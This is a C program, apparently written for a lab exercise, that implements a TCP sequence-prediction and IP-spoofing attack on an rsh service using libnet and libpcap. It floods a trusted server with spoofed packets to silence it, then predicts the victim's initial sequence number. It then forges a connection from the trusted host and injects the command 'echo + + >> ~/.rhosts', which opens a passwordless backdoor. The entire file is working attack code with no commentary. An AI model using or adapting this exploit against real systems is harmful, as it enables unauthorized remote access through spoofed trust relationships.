
#include "globals.h"
#include "typedef.h"
#include "utils_libnet.h"
#include "utils_libpcap.h"

#define DISABLE_SERVER "disable"
#define ENABLE_SERVER "enable"

void toggleServer(char *toggle) {
  Libnet libnet = makeLibnet();
  IPAddresses addresses = makeIPAddresses("172.16.24.2", "172.16.24.3");

  uint32_t payloadLength = strlen(toggle);

  uint16_t sourcePort = 530;
  uint16_t destinationPort = 513;
  uint32_t sequenceNumber = 128000;
  uint32_t acknowledgementNumber = 0;

  PayloadOptions payloadOptions =
      makePayloadOptions(toggle, payloadLength, libnet, 0);
  TCPOptions tcpOptions =
      makeTCPOptions(sourcePort, destinationPort, sequenceNumber,
                     acknowledgementNumber, TH_SYN, payloadLength, libnet, 0);
  IPv4Options ipv4Options = makeIPv4TCPOptions(
      addresses.source, addresses.destination, payloadLength, libnet, 0);

  addPayloadToContext(payloadOptions);
  addTCPToContext(tcpOptions);
  addIPv4ToContext(ipv4Options);

  if (strcmp(toggle, DISABLE_SERVER) == 0) {
    for (int i = 0; i < 10; i++) {
      libnet_write(libnet.context);
    }
  } else if (strcmp(toggle, ENABLE_SERVER) == 0) {
    libnet_write(libnet.context);
  }
  freeLibnet(libnet);
}

void probeXterminal() {
  Libnet ACKLibnet = makeLibnet();
  IPAddresses addresses = makeIPAddresses("172.16.24.2", "172.16.24.4");

  uint16_t sourcePort = 530;
  uint16_t destinationPort = 514;
  uint32_t sequenceNumber = 128000;
  uint32_t acknowledgementNumber = 0;
  uint32_t payloadLength = 0;

  TCPOptions tcpACKOptions = makeTCPOptions(
      sourcePort, destinationPort, sequenceNumber, acknowledgementNumber,
      TH_SYN, payloadLength, ACKLibnet, 0);
  IPv4Options ipv4ACKOptions = makeIPv4TCPOptions(
      addresses.source, addresses.destination, payloadLength, ACKLibnet, 0);

  addTCPToContext(tcpACKOptions);
  addIPv4ToContext(ipv4ACKOptions);

  Libnet RSTLibnet = makeLibnet();
  TCPOptions tcpRSTOptions = tcpACKOptions;
  IPv4Options ipv4RSTOptions = ipv4ACKOptions;
  tcpRSTOptions.sequence += 1;
  tcpRSTOptions.control = TH_RST;
  tcpRSTOptions.libnet = RSTLibnet;
  ipv4RSTOptions.libnet = RSTLibnet;

  addTCPToContext(tcpRSTOptions);
  addIPv4ToContext(ipv4RSTOptions);

  libnet_write(ACKLibnet.context);
  usleep(1000);
  libnet_write(RSTLibnet.context);

  freeLibnet(ACKLibnet);
  freeLibnet(RSTLibnet);
}

uint32_t calculateISN() {
  printf("Probing victim...\n");
  const u_char *data = NULL;
  struct pcap_pkthdr *header = NULL;
  uint32_t isn = 0, prevIsn = 0, difference = 0, prevDifference = 0,
           predictedIsn = 0, differenceSquared = 0, prevDifferenceSquare = 0;
  uint8_t match = 0;
  Pcap pcap = makePcap("tcp and src host 172.16.24.4");
  while (1) {
    probeXterminal();
    pcap_next_ex(pcap.handle, &header, &data);
    Packet packet = makePacket(data);
    isn = byteToUint32littleEndian(packet.tcp->th_seq);
    if (prevIsn == 0) {
      prevIsn = isn;
      continue;
    }
    difference = prevIsn - isn;
    if (prevDifference == 0) {
      prevDifference = difference;
      continue;
    }
    differenceSquared = prevDifference - difference;
    if (prevDifferenceSquare == 0) {
      prevDifferenceSquare = differenceSquared;
      continue;
    }
    if (differenceSquared == 1337 && prevDifferenceSquare != 1337) {
      predictedIsn = isn - (difference - 1337);
      if (differenceSquared == 1337 && prevDifferenceSquare == 1337) {
        if (predictedIsn != isn) {
          match = 0;
        }
      }
      if (match > 3) {
        printf("Predicted ISN: %u\n", predictedIsn);
        freePcap(pcap);
        return predictedIsn;
      }
      match += 1;
    }
    prevIsn = isn;
    prevDifference = difference;
    prevDifferenceSquare = differenceSquared;
  }
  freePcap(pcap);
  return 0;
}

uint16_t setupBackdoor(char *buffer, char *clientUsername, char *serverUsername,
                       char *command) {
  uint16_t length = 0;
  length += sprintf(buffer, "0");
  *(buffer + length) = '\0';
  length += 1;
  length +=
      snprintf(buffer + length, STRING_BUFF_SIZE / 2, "%s", clientUsername);
  *(buffer + length) = '\0';
  length += 1;
  length +=
      snprintf(buffer + length, STRING_BUFF_SIZE / 2, "%s", serverUsername);
  *(buffer + length) = '\0';
  length += 1;
  length += snprintf(buffer + length, STRING_BUFF_SIZE / 2, "%s", command);
  *(buffer + length) = '\0';
  length += 1;
  return length;
}

void injectPacket(uint32_t predictedIsn) {
  printf("Injecting backdoor...\n");
  Libnet handshakeLibnet = makeLibnet();
  uint16_t payloadLength = 0, sourcePort = 513, destinationPort = 514;
  uint32_t serverSequenceNumber = 256000, acknowledgementNumber = 0;
  uint8_t control = TH_SYN;

  IPAddresses addresses = makeIPAddresses("172.16.24.3", "172.16.24.4");
  IPv4Options ipOptions =
      makeIPv4TCPOptions(addresses.source, addresses.destination, payloadLength,
                         handshakeLibnet, 0);
  TCPOptions handshakeTcpOptions = makeTCPOptions(
      sourcePort, destinationPort, serverSequenceNumber, acknowledgementNumber,
      control, payloadLength, handshakeLibnet, 0);
  // PayloadOptions payloadOptions = makePayloadOptions(backdoor, 43, libnet,
  // 0);
  libnet_ptag_t handshakeTcpPtag = addTCPToContext(handshakeTcpOptions);
  addIPv4ToContext(ipOptions);
  libnet_write(handshakeLibnet.context);

  handshakeTcpOptions.acknowledgement = predictedIsn + 1;
  handshakeTcpOptions.sequence = handshakeTcpOptions.sequence + 1;
  handshakeTcpOptions.control = TH_ACK;
  handshakeTcpOptions.ptag = handshakeTcpPtag;
  addTCPToContext(handshakeTcpOptions);
  sleep(1);
  libnet_write(handshakeLibnet.context);

  Libnet backdoorLibnet = makeLibnet();
  char backdoor[STRING_BUFF_SIZE] = {'\0'};
  payloadLength =
      setupBackdoor(backdoor, "tsutomu", "tsutomu", "echo + + >> ~/.rhosts");
  PayloadOptions backdoorPayloadOptions =
      makePayloadOptions(backdoor, payloadLength, backdoorLibnet, 0);
  TCPOptions backdoorTCPOptions = makeTCPOptions(
      sourcePort, destinationPort, serverSequenceNumber + 1, predictedIsn + 1,
      TH_ACK | TH_PUSH, payloadLength, backdoorLibnet, 0);
  IPv4Options backdoorIpv4Options =
      makeIPv4TCPOptions(addresses.source, addresses.destination, payloadLength,
                         backdoorLibnet, 0);
  addPayloadToContext(backdoorPayloadOptions);
  addTCPToContext(backdoorTCPOptions);
  addIPv4ToContext(backdoorIpv4Options);
  sleep(1);
  libnet_write(backdoorLibnet.context);
}

int main(void) {
  printf("Disabling server...\n");
  toggleServer(DISABLE_SERVER);
  injectPacket(calculateISN());
  printf("Enabling server...\n");
  toggleServer(ENABLE_SERVER);
  printf("Finished!\n");
  return 0;
}
